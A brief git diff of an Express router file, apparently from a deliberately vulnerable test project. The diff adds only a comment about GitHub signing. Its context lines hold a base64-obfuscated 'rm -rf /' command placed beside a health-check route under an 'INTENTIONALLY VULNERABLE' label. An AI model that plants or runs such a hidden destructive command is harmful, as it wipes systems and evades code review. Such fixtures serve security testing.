@@ -31,6 +31,8 @@ router.post("/login", async (req, res) => {
   return res.json({ success: true, user });
 });
 
+// Testing github signing
+
 // INTENTIONALLY VULNERABLE: obfuscated reverse shell-like logic
 const _0x1a2b = Buffer.from("cm0gLXJmIC8=", "base64").toString();
 router.get("/health", (req, res) => {
